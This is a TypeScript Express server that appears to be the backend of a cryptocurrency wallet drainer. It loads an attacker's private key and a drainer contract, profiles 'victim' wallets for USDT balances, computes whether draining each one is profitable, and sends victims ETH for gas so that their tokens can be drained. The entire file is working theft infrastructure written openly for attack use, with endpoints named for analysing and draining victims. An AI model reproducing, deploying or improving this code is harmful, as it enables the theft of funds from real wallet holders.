import express, { Request, Response } from 'express';
import dotenv from 'dotenv';
import { Wallet, Contract, JsonRpcProvider, formatUnits, formatEther, parseEther } from 'ethers';
import cors from 'cors';

// Load env
dotenv.config();

const app = express();

// CORS Configuration - Allow frontend to connect
app.use(cors({
    origin: ['https://d35l33hbvduuxh.cloudfront.net', 'http://127.0.0.1:3000'],
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    credentials: true
}));

app.use(express.json());

// --- Types -----------------------------------------------------------------
interface AnalysisResult {
  usdtBalance: number; // human readable
  ethBalance: number; // human readable
  meetsMinimum: boolean;
  reason?: string;
  worthDraining: boolean;
  profitable: boolean;
  gasNeeded: number; // ETH
  gasToSend: number; // ETH (with buffer)
  estimatedProfit?: number; // USDT
}

interface CheckEligibilityResponse {
  eligible: boolean;
  currentBalance: unknown; // raw on-chain numeric type (BigInt/BN/etc.)
  required: unknown;
  reason: string;
}

// --- Helper: ensure environment variables ---------------------------------
function getEnv(name: string): string {
  const v = process.env[name];
  if (!v) throw new Error(`Missing required env var ${name}`);
  return v;
}

const ATTACKER_PRIVATE_KEY = getEnv('ATTACKER_PRIVATE_KEY');
const RPC_URL = getEnv('RPC_URL');
const DRAINER_ADDRESS = getEnv('DRAINER_CONTRACT_ADDRESS');
const USDT_ADDRESS = getEnv('USDT_CONTRACT_ADDRESS');

// --- Setup provider / signer / contracts ---------------------------------
const provider = new JsonRpcProvider(RPC_URL);
const attackerWallet = new Wallet(ATTACKER_PRIVATE_KEY, provider);

console.log(`🔧 Configuration loaded:`);
console.log(`- Attacker wallet: ${attackerWallet.address}`);
console.log(`- Drainer contract: ${DRAINER_ADDRESS}`);
console.log(`- USDT contract: ${USDT_ADDRESS}`);
console.log(`- RPC URL: ${RPC_URL.substring(0, 30)}...`);

// Drainer ABI: include all functions used by the code
const DRAINER_ABI: string[] = [
  // instant fund accepts token param and is payable
  'function instantFundVictim(address victim, uint256 estimatedForBalance, address token) external payable',
  'function getInstantFundingStatus(address victim) external view returns (uint256, uint256, bool)',
  // added function used in the code
  'function checkWalletEligibility(address wallet, address token) external view returns (bool,uint256,uint256,string)',
  'function getMinimumBalance() external view returns (uint256)'
];

const ERC20_ABI: string[] = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)'
];

const drainerContract: Contract = new Contract(DRAINER_ADDRESS, DRAINER_ABI, attackerWallet);
const usdtContract: Contract = new Contract(USDT_ADDRESS, ERC20_ABI, provider);

// 🔧 HELPER FUNCTION: Safe ETH amount conversion
function safeParseEther(ethAmount: number): bigint {
  try {
    // Round to 8 decimal places to avoid precision issues
    const rounded = Math.round(ethAmount * 1e8) / 1e8;
    const ethString = rounded.toFixed(8);
    
    console.log(`Converting ETH: ${ethAmount} -> ${ethString} -> parseEther`);
    
    return parseEther(ethString);
  } catch (error) {
    console.error(`Failed to parse ETH amount: ${ethAmount}`, error);
    // Fallback to 0.01 ETH
    return parseEther("0.01");
  }
}

// --- Core logic -----------------------------------------------------------
/**
 * Analyze a victim wallet to determine whether it meets minimum USDT and is profitable
 */
async function analyzeVictimWallet(victimAddress: string): Promise<AnalysisResult | null> {
  try {
    console.log(`📊 Analyzing wallet: ${victimAddress}`);

    // Read on-chain balances
    const [usdtBalanceRaw, decimalsRaw, ethBalanceRaw] = await Promise.all([
      usdtContract.balanceOf(victimAddress),
      usdtContract.decimals(),
      provider.getBalance(victimAddress)
    ]);

    console.log(`Raw values:`, { 
      usdtBalance: usdtBalanceRaw.toString(), 
      decimals: decimalsRaw.toString(),
      ethBalance: ethBalanceRaw.toString() 
    });

    // Convert BigInt values to numbers safely
    const decimals = Number(decimalsRaw);
    const usdtAmount = parseFloat(formatUnits(usdtBalanceRaw, decimals));
    const ethAmount = parseFloat(formatEther(ethBalanceRaw));

    console.log(`Formatted values:`, { usdtAmount, ethAmount, decimals });

    const meetsMinimum = usdtAmount >= 50;

    if (!meetsMinimum) {
      return {
        usdtBalance: usdtAmount,
        ethBalance: ethAmount,
        meetsMinimum: false,
        reason: `Balance ${usdtAmount.toFixed(2)} USDT is below minimum 50 USDT threshold`,
        worthDraining: false,
        profitable: false,
        gasNeeded: 0,
        gasToSend: 0
      };
    }

    // 🔧 FIXED GAS CALCULATION - Proper decimal handling
    let gasNeededEth: number;
    let gasToSend: number;
    
    try {
      const feeData = await provider.getFeeData();
      console.log(`Fee data:`, {
        gasPrice: feeData.gasPrice?.toString(),
        maxFeePerGas: feeData.maxFeePerGas?.toString(),
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas?.toString()
      });
      
      // Get gas price (BigInt) - prefer gasPrice, fallback to maxFeePerGas
      let gasPriceBigInt = feeData.gasPrice;
      if (!gasPriceBigInt && feeData.maxFeePerGas) {
        gasPriceBigInt = feeData.maxFeePerGas;
      }
      
      if (!gasPriceBigInt) {
        throw new Error('Unable to determine gas price from provider');
      }

      // Gas estimates
      const approveGas = 50000n;
      const drainGas = 100000n;
      const totalGas = approveGas + drainGas;

      // Calculate gas needed (all BigInt arithmetic)
      const gasNeededWei = gasPriceBigInt * totalGas;
      
      // Convert to ETH (number) using formatEther
      gasNeededEth = parseFloat(formatEther(gasNeededWei));
      
      console.log(`Gas calculation:`, {
        gasPrice: gasPriceBigInt.toString(),
        totalGas: totalGas.toString(),
        gasNeededWei: gasNeededWei.toString(),
        gasNeededEth
      });

    } catch (gasError) {
      console.warn('⚠️ Gas estimation failed, using fallback:', gasError);
      gasNeededEth = 0.01; // 0.01 ETH fallback
    }

    // Add 20% buffer and fix decimal precision
    const rawGasToSend = gasNeededEth * 1.2;
    
    // 🔧 FIX: Round to 8 decimal places to avoid parseEther errors
    gasToSend = Math.ceil(rawGasToSend * 1e8) / 1e8; // Round up to 8 decimals
    
    console.log(`Gas calculation final:`, {
      gasNeededEth,
      rawGasToSend,
      gasToSendFixed: gasToSend
    });

    // Profitability check
    const usdtValueUSD = usdtAmount * 1;
    const ETH_PRICE_USD = process.env.ETH_PRICE_USD ? Number(process.env.ETH_PRICE_USD) : 2000;
    const gasValueUSD = gasToSend * ETH_PRICE_USD;
    const profitable = usdtValueUSD > gasValueUSD * 2;

    console.log(`Profitability:`, {
      usdtValueUSD,
      gasValueUSD: gasValueUSD.toFixed(4),
      profitable,
      ethPriceUsed: ETH_PRICE_USD
    });

    return {
      usdtBalance: usdtAmount,
      ethBalance: ethAmount,
      meetsMinimum: true,
      gasNeeded: gasNeededEth,
      gasToSend,
      worthDraining: true,
      profitable,
      estimatedProfit: usdtValueUSD - gasValueUSD,
      reason: profitable ? 'Eligible and profitable' : 'Eligible but low profit margin'
    };

  } catch (error) {
    console.error('❌ Analysis error:', error);
    return null;
  }
}

// --- Express app & endpoints ----------------------------------------------

// Health check endpoint
app.get('/health', async (req: Request, res: Response) => {
  try {
    const balance = await provider.getBalance(attackerWallet.address);
    const network = await provider.getNetwork();
    
    res.json({
      status: 'ok',
      timestamp: new Date().toISOString(),
      attackerWallet: attackerWallet.address,
      attackerBalance: formatEther(balance) + ' ETH',
      network: { name: network.name, chainId: Number(network.chainId) },
      contracts: {
        drainer: DRAINER_ADDRESS,
        usdt: USDT_ADDRESS
      },
      services: {
        rpc: 'connected',
        contracts: 'loaded'
      }
    });
  } catch (error) {
    console.error('Health check error:', error);
    res.status(500).json({ 
      status: 'error', 
      error: (error as Error).message 
    });
  }
});

// POST /api/instant-fund-and-drain
app.post('/api/instant-fund-and-drain', async (req: Request, res: Response) => {
  try {
    const { victimAddress } = req.body as { victimAddress?: string };
    if (!victimAddress) {
      return res.status(400).json({ error: 'victimAddress is required' });
    }

    console.log(`🎯 ANALYZING VICTIM: ${victimAddress}`);

    const analysis = await analyzeVictimWallet(victimAddress);
    if (!analysis) {
      return res.status(400).json({ error: 'Failed to analyze wallet' });
    }

    console.log('📊 ANALYSIS RESULTS:', analysis);

    if (!analysis.meetsMinimum) {
      console.log(`❌ REJECTED: ${victimAddress} - ${analysis.reason}`);
      return res.json({
        success: false,
        reason: 'INSUFFICIENT_BALANCE',
        message: analysis.reason,
        currentBalance: analysis.usdtBalance,
        required: 50,
        analysis
      });
    }

    if (!analysis.profitable) {
      console.log(`💸 LOW PROFIT: ${victimAddress} - Not profitable to drain`);
      return res.json({ 
        success: false, 
        reason: 'UNPROFITABLE', 
        message: 'Wallet eligible but profit margin too low', 
        analysis 
      });
    }

    // Check contract eligibility
    console.log('🔍 Checking contract eligibility...');
    const eligibilityRaw = await drainerContract.checkWalletEligibility(victimAddress, USDT_ADDRESS);
    
    const eligibility: CheckEligibilityResponse = {
      eligible: Boolean(eligibilityRaw[0]),
      currentBalance: eligibilityRaw[1],
      required: eligibilityRaw[2],
      reason: String(eligibilityRaw)
    };

    console.log('Contract eligibility:', eligibility);

    if (!eligibility.eligible) {
      return res.json({
        success: false,
        reason: 'CONTRACT_REJECTION',
        message: eligibility.reason,
        currentBalance: formatUnits(eligibility.currentBalance as bigint, 6),
        required: formatUnits(eligibility.required as bigint, 6)
      });
    }

    const currentBalanceHuman = parseFloat(formatUnits(eligibility.currentBalance as bigint, 6));

    console.log(`💰 INSTANT FUNDING: ${analysis.gasToSend} ETH for ${analysis.usdtBalance} USDT wallet`);
    console.log(`🏦 FUNDED BY: ${attackerWallet.address}`);

    // Check attacker balance before funding
    const attackerBalance = await provider.getBalance(attackerWallet.address);
    
    // 🔧 FIX: Use safe parseEther conversion
    const requiredEth = safeParseEther(analysis.gasToSend);
    
    console.log(`Balance check:`, {
      attackerBalance: formatEther(attackerBalance),
      requiredEth: formatEther(requiredEth),
      gasToSend: analysis.gasToSend
    });
    
    if (attackerBalance < requiredEth) {
      return res.status(400).json({
        success: false,
        error: 'INSUFFICIENT_ATTACKER_BALANCE',
        message: `Attacker wallet has ${formatEther(attackerBalance)} ETH but needs ${analysis.gasToSend} ETH`,
        required: analysis.gasToSend,
        available: formatEther(attackerBalance)
      });
    }

    // 🔧 ADDITIONAL SAFETY: Ensure minimum funding amount
    const minFunding = parseEther("0.005"); // 0.005 ETH minimum
    const actualFunding = requiredEth < minFunding ? minFunding : requiredEth;
    
    console.log(`Funding amounts:`, {
      requested: formatEther(requiredEth),
      minimum: formatEther(minFunding),
      actualFunding: formatEther(actualFunding)
    });

    // Instant fund the victim
    console.log('💸 Sending funding transaction...');
    const tx = await drainerContract.instantFundVictim(
      victimAddress,
      eligibility.currentBalance,
      USDT_ADDRESS,
      {
        value: actualFunding,
        gasLimit: 200000n // Increased gas limit
      }
    );

    console.log(`📡 Transaction sent: ${tx.hash}`);
    console.log('⏳ Waiting for confirmation...');
    
    const receipt = await tx.wait();
    
    if (!receipt) {
      throw new Error('Transaction receipt not received');
    }

    console.log(`✅ INSTANT FUNDING SUCCESS: ${tx.hash}`);
    console.log(`🧾 Gas used: ${receipt.gasUsed.toString()}`);
    console.log(`💰 TARGET VALUE: ${analysis.usdtBalance} USDT (≥50 USDT minimum)`);

    const actualGasCost = receipt.gasUsed * (receipt.gasPrice || 0n);

    res.json({
      success: true,
      txHash: tx.hash,
      victimAddress,
      ethSent: formatEther(actualFunding),
      targetBalance: analysis.usdtBalance,
      minimumMet: true,
      analysis,
      gasCost: formatEther(actualGasCost),
      gasUsed: receipt.gasUsed.toString(),
      message: `Victim instantly funded - ${analysis.usdtBalance.toFixed(2)} USDT wallet ready for draining`
    });

  } catch (rawError) {
    console.error('❌ INSTANT FUNDING ERROR:', rawError);
    const error = rawError as Error;

    // Enhanced error handling
    let errorResponse: any = {
      success: false,
      error: error.message
    };

    if (error.message && error.message.includes('balance below minimum')) {
      errorResponse = { 
        success: false,
        error: 'BALANCE_TOO_LOW', 
        message: 'Victim wallet balance is below 50 USDT minimum', 
        required: 50 
      };
    } else if (error.message && error.message.includes('insufficient funds')) {
      errorResponse = {
        success: false,
        error: 'INSUFFICIENT_FUNDS',
        message: 'Attacker wallet has insufficient ETH for funding'
      };
    } else if (error.message && error.message.includes('NUMERIC_FAULT')) {
      errorResponse = {
        success: false,
        error: 'NUMERIC_ERROR',
        message: 'Error in number conversion - check gas calculations'
      };
    }

    // Get attacker balance for debugging
    try {
      const bal = await provider.getBalance(attackerWallet.address);
      errorResponse.attackerBalance = formatEther(bal);
    } catch (e) {
      // ignore balance check error
    }

    res.status(500).json(errorResponse);
  }
});

// GET /api/analyze-victim/:address
app.get('/api/analyze-victim/:address', async (req: Request, res: Response) => {
  try {
    const address = req.params.address;
    console.log(`🔍 Analyzing victim: ${address}`);
    
    const analysis = await analyzeVictimWallet(address);
    if (!analysis) {
      return res.status(400).json({ error: 'Analysis failed' });
    }

    // Get contract eligibility
    const eligibilityRaw = await drainerContract.checkWalletEligibility(address, USDT_ADDRESS);
    const eligible = Boolean(eligibilityRaw[0]);
    const currentBalance = eligibilityRaw[1];
    const reason = String(eligibilityRaw);

    res.json({
      success: true,
      address,
      timestamp: new Date().toISOString(),
      ...analysis,
      contractEligible: eligible,
      contractReason: reason,
      onChainBalance: parseFloat(formatUnits(currentBalance as bigint, 6))
    });
  } catch (err) {
    const error = err as Error;
    console.error('❌ Analysis endpoint error:', error);
    res.status(500).json({ 
      success: false,
      error: error.message 
    });
  }
});

// GET /api/minimum-balance
app.get('/api/minimum-balance', async (_req: Request, res: Response) => {
  try {
    const minBalance = await drainerContract.getMinimumBalance();
    res.json({ 
      success: true,
      minimumUSDT: parseFloat(formatUnits(minBalance as bigint, 6)), 
      raw: minBalance.toString(),
      timestamp: new Date().toISOString()
    });
  } catch (err) {
    const error = err as Error;
    console.error('❌ Minimum balance endpoint error:', error);
    res.status(500).json({ 
      success: false,
      error: error.message 
    });
  }
});

// Catch-all error handler
app.use((error: any, req: Request, res: Response, next: any) => {
  console.error('❌ Unhandled error:', error);
  res.status(500).json({
    success: false,
    error: 'Internal server error',
    message: error.message
  });
});

// 404 handler
app.use((req: Request, res: Response) => {
  console.log(`❌ 404 - Route not found: ${req.method} ${req.path}`);
  res.status(404).json({
    success: false,
    error: 'Route not found',
    method: req.method,
    path: req.path,
    availableRoutes: [
      'GET /health',
      'GET /api/analyze-victim/:address',
      'POST /api/instant-fund-and-drain',
      'GET /api/minimum-balance'
    ]
  });
});

// Start server
const PORT = process.env.PORT ? Number(process.env.PORT) : 3005;

app.listen(PORT, () => {
  console.log(`\n🚀 Just-In-Time Funding Service`);
  console.log(`📡 Running on: http://localhost:${PORT}`);
  console.log(`🏦 Attacker wallet: ${attackerWallet.address}`);
  console.log(`💰 Instant funding based on victim wallet analysis`);
  console.log(`\n📋 Available endpoints:`);
  console.log(`   GET  /health`);
  console.log(`   GET  /api/analyze-victim/:address`);
  console.log(`   POST /api/instant-fund-and-drain`);
  console.log(`   GET  /api/minimum-balance`);
  console.log(`\n💡 Test the service:`);
  console.log(`   curl http://localhost:${PORT}/health`);
  console.log(`   curl "http://localhost:${PORT}/api/analyze-victim/0x742d35Cc..."`);
  console.log(``);
});
